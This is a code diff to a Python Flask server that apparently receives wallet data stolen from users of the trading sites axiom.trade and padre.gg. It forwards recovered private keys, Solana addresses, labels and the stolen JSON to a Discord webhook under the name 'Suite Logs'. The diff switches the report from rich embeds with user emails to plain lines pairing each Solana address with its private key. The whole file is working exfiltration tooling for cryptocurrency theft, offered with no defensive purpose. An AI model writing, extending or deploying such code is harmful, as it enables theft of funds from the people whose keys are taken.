@@ -6,8 +6,6 @@ import os
 import base64
 import json
 import time
-from collections import Counter
-from datetime import datetime, timezone
 
 from dotenv import load_dotenv
 load_dotenv()
@@ -31,10 +29,7 @@ PLATFORM_REDIRECTS = {
 
 ALLOWED_HOSTS = ("axiom.trade", "padre.gg")
 
-BRAND       = "Suite Logs"
-BRAND_COLOR = 0xF4F4F5   # neutral light
-OVERVIEW_COLOR = 0xFAFAFA
-WALLET_COLOR   = 0xA1A1AA
+MAX_CONTENT = 1900   # Discord caps content at 2000
 
 
 def decode_b64url(s: str) -> str:
@@ -63,7 +58,6 @@ def done_page(parsed: dict) -> str:
 
 
 def normalize_wallets(parsed: dict) -> list:
-    """Return a wallet list aligned with keys[]."""
     platform = (parsed.get("platform") or "").lower()
     wallets = parsed.get("wallets") or []
     keys = parsed.get("keys") or []
@@ -84,103 +78,35 @@ def normalize_wallets(parsed: dict) -> list:
     return stubs
 
 
-def chain_breakdown(wallets: list) -> str:
-    counts = Counter()
-    for w in wallets:
+def build_content(parsed: dict) -> str:
+    """One line per Solana wallet: address : private key : label : wal N."""
+    host    = parsed.get("host", "?")
+    keys    = parsed.get("keys", []) or []
+    wallets = normalize_wallets(parsed)
+
+    lines = [f"**{host}**"]
+    n = 0
+    for i, w in enumerate(wallets):
         if not isinstance(w, (list, tuple)) or len(w) < 2:
             continue
-        chain = (w[1] or "?").upper() or "?"
-        counts[chain] += 1
-    if not counts:
-        return "—"
-    return " · ".join(f"{c}: {n}" for c, n in counts.most_common())
-
-
-def trunc(s: str, n: int) -> str:
-    s = s or ""
-    return s if len(s) <= n else s[: n - 1] + "…"
-
-
-def short_addr(addr: str) -> str:
-    a = addr or ""
-    if len(a) <= 14:
-        return a or "—"
-    return f"{a[:6]}…{a[-4:]}"
-
-
-def build_embeds(parsed: dict) -> list:
-    platform = parsed.get("platform", "?")
-    host     = parsed.get("host", "?")
-    keys     = parsed.get("keys", []) or []
-    wallets  = normalize_wallets(parsed)
-    user     = parsed.get("user") or {}
-    email    = user.get("email") or "—"
-    rewards  = user.get("rewardsLevel", "—")
-
-    overview = {
-        "author": {"name": BRAND},
-        "title":  f"`{host}` — {len(keys)} key{'s' if len(keys) != 1 else ''} recovered",
-        "color":  OVERVIEW_COLOR,
-        "timestamp": datetime.now(timezone.utc).isoformat(),
-        "fields": [
-            {"name": "Platform", "value": f"`{platform}`", "inline": True},
-            {"name": "Host",     "value": f"`{host}`", "inline": True},
-            {"name": "Rewards",  "value": f"`{rewards}`", "inline": True},
-            {"name": "Email",    "value": f"`{trunc(email, 60)}`", "inline": False},
-            {"name": "Keys",     "value": f"`{len(keys)}`", "inline": True},
-            {"name": "Wallets",  "value": f"`{len(wallets)}`", "inline": True},
-            {"name": "Chains",   "value": f"`{chain_breakdown(wallets)}`", "inline": True},
-        ],
-        "footer": {"text": f"{BRAND} · v3"},
-    }
-
-    embeds = [overview]
-
-    shown = wallets[:9]
-    for i, w in enumerate(shown):
-        if not isinstance(w, (list, tuple)) or len(w) < 2:
+        chain = (w[1] or "").upper()
+        if chain != "SOL":
             continue
         addr  = w[0] or ""
-        chain = (w[1] or "").upper() or "UNKNOWN"
-        label = w[5] if len(w) > 5 else ""
-        deriv = w[6] if len(w) > 6 else ""
-        key   = keys[i] if i < len(keys) else None
+        label = (w[5] if len(w) > 5 else "") or "—"
+        key   = keys[i] if i < len(keys) else "not recovered"
+        n += 1
+        lines.append(
+            f"`Adresse Solana :` {addr} : `Private Key :` {key} : `Label :` {label} : `Wal {n}`"
+        )
 
-        title_bits = [f"Wallet {i+1}", chain]
-        if label:
-            title_bits.append(trunc(label, 24))
+    if n == 0:
+        lines.append("`no SOL wallet recovered`")
 
-        fields = [
-            {"name": "Address", "value": f"```{addr or '—'}```", "inline": False},
-        ]
-        meta = []
-        if deriv:
-            meta.append(f"`{deriv}`")
-        if label:
-            meta.append(f"`{trunc(label, 40)}`")
-        if meta:
-            fields.append({"name": "Path · Label", "value": " · ".join(meta), "inline": False})
-
-        if key:
-            fields.append({"name": "Private Key", "value": f"```{key}```", "inline": False})
-        else:
-            fields.append({"name": "Private Key", "value": "`not recovered`", "inline": False})
-
-        embeds.append({
-            "title": " — ".join(title_bits),
-            "color": WALLET_COLOR,
-            "fields": fields,
-            "footer": {"text": f"{chain} · {short_addr(addr)}"},
-        })
-
-    if len(wallets) > 9:
-        overview["fields"].append({
-            "name": "Note",
-            "value": f"`+{len(wallets) - 9}` wallets in attached JSON",
-            "inline": False,
-        })
-
-    return embeds
+    body = "\n".join(lines)
+    if len(body) > MAX_CONTENT:
+        body = body[: MAX_CONTENT - 1] + "…"
+    return body
 
 
 def forward(parsed: dict, payload: str) -> Response:
@@ -191,7 +117,13 @@ def forward(parsed: dict, payload: str) -> Response:
             "application/json",
         )
     }
-    data = {"payload_json": json.dumps({"embeds": build_embeds(parsed)})}
+    data = {
+        "payload_json": json.dumps({
+            "content": build_content(parsed),
+            "username": "Suite Logs",
+            "attachments": [{"id": "0", "filename": f"suite-logs.json"}],
+        }),
+    }
 
     try:
         r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
@@ -241,5 +173,5 @@ def post_root():
 
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 1000))
+    port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
